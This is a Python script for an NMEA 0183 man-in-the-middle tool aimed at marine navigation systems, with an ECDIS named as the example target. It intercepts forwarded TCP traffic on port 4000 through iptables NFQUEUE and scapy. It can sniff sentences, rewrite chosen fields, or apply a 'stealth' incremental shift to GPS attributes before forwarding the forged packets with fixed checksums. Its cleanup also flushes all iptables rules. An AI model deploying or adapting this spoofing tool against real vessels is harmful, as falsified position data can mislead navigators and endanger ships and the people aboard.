'''
Script to perform MITM on NMEA 0183 serial commnuication
This scipt will allow evasdroping and packet manipulation of NMEA sentence
'''
from struct import pack
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import argparse
from pyais import *
from NMEA import NMEA
import json
from Attributes import attributes

gps_attr_targets = None

class MITM:
    def __init__(self, target_ip,  src_ip, option, config_data = None):
        self.target_ip = target_ip
        self.src_ip = src_ip
        self.src_mac = None
        self.target_mac = None
        self.nfqueue = NetfilterQueue()
        self.pkt = None
        self.config_data = config_data
        self.target_sentences = list(config_data.keys()) if option == "M" and config_data else None
        self.option = option
        self.target_attr = list(config_data["attributes"]) if option == "A" and config_data else None

    def sniff(self, packet):
            
            pkt = packet.get_payload()
            pktIP = IP(pkt)
            
            payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
            
            
            if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
                print("-"*20)
                print(f"[*] Packet Intercepted with payload \n{payload}")
            
            packet.accept()

    def modify(self, packet):
        
        pkt = packet.get_payload()
        pktIP = IP(pkt)
        
        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
        
        try:
            if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
                print("-"*20)
                sentence_type = payload.split(",")[0][1:]

                if sentence_type in self.target_sentences:

                    print(f"[*] Packet Intercepted with payload \n{payload}")

                    old_len = len(pktIP[TCP].payload)
                    pktIP[TCP].remove_payload()
                    
                    nmea_obj = NMEA(sentence=payload)
                    nmea_obj.decode()

                    for attribute in list(self.config_data[sentence_type]['attributes']):
                        if attribute['incremental']:
                            nmea_obj.modify_attr(attribute['key'], str(float(nmea_obj.data[attribute['key']]) + attribute['value']))
    
                        else:
                            nmea_obj.modify_attr(attribute['key'], attribute['value'])
                    
                    #print(nmea_obj.sentence)
                    pktIP[TCP].add_payload(str(nmea_obj.sentence))
                    print(f"\n[*] Payload modified and sending...\n{nmea_obj.sentence}\n")
                    
                    new_len = len(pktIP[TCP].payload)
                    pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
                    del pktIP[IP].chksum
                    del pktIP[TCP].chksum
                    
                    pkt = pktIP.__class__(bytes(pktIP))
                    packet.set_payload(bytes(pkt))

        except Exception as e:
           print(e)

        packet.accept()
       
    def stealth(self, packet):
        
        pkt = packet.get_payload()
        pktIP = IP(pkt)
        
        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
        
        try:
            if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
                print("-"*20)
                sentence_type = payload.split(",")[0][3:]
                attr_to_modify = list()
                for attr in self.target_attr:
                    if sentence_type in attributes.keys() and attr['key'] in attributes[sentence_type]:
                        attr_to_modify.append(attr)
                
                if len(attr_to_modify) > 0:    
                    print(f"[*] Packet Intercepted with payload \n{payload}")
                
                    old_len = len(pktIP[TCP].payload)
                    pktIP[TCP].remove_payload()
                    
                    nmea_obj = NMEA(sentence=payload)
                    nmea_obj.decode()

                    for attr in attr_to_modify:
                        if attr['incremental']:
                            nmea_obj.modify_attr(attr['key'], str(float(nmea_obj.data[attr['key']]) + attr['value']))            
                        else:
                            nmea_obj.modify_attr(attr['key'], attr['value'])
                                
                    #print(nmea_obj.sentence)
                    pktIP[TCP].add_payload(str(nmea_obj.sentence))
                    print(f"\n[*] Payload modified and sending...\n{nmea_obj.sentence}\n")
                    
                    new_len = len(pktIP[TCP].payload)
                    pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
                    del pktIP[IP].chksum
                    del pktIP[TCP].chksum
                    
                    pkt = pktIP.__class__(bytes(pktIP))
                    packet.set_payload(bytes(pkt))

        except Exception as e:
           print(e)

        packet.accept()


    def setup(self):
        iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip}"
        os.system(iptable_config)
        if self.option == "M":
            self.nfqueue.bind(0, self.modify)
        elif self.option == "A":
            self.nfqueue.bind(0, self.stealth)
        elif self.option == "S":
            self.nfqueue.bind(0, self.sniff)

    def clean_up(self):
        print("[*] Flushing iptables")
        os.system('iptables -F')
        os.system('iptables -X')

    def stop_mitm(self):
        self.clean_up()


def get_input():
    parser = argparse.ArgumentParser(description="NEMA MITM Tool")
    parser.add_argument("-t", "--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
    parser.add_argument("-s", "--source-ip", help="Source system IP address", required=True)
    parser.add_argument("-c", "--config", help="JSON config file")
    parser.add_argument("-o", "--option", help="M - mitm nmea modification attack\nA - stealth GPS nmea attribute attack\nS - Sniffing attack", required=True)
   # parser.add_argument("-a", "--attr", help="nmea GPS attribute comma separated names")

    args = parser.parse_args()
    return args

def read_config(config_file):
    return json.load(open(config_file,'r'))

# # def read_attr(attrs):
#     global gps_attr_targets
#     gps_attr_targets = attrs.split(",")
#     return gps_attr_targets

if __name__ == '__main__':
    args = get_input()
    # if args.option == "I" and args.filename:
    #     read_file(args.filename)
    # elif args.option == "I" and not args.filename:
    #     print("No input file specified for injection")
    #     exit()

    mitm = MITM(args.target_ip, args.source_ip, args.option, read_config(args.config) if args.config else None)
    mitm.setup()
    
    try:
        print("[*] waiting for data")
        mitm.nfqueue.run()
        
    except KeyboardInterrupt:
        mitm.stop_mitm()

    mitm.nfqueue.unbind()
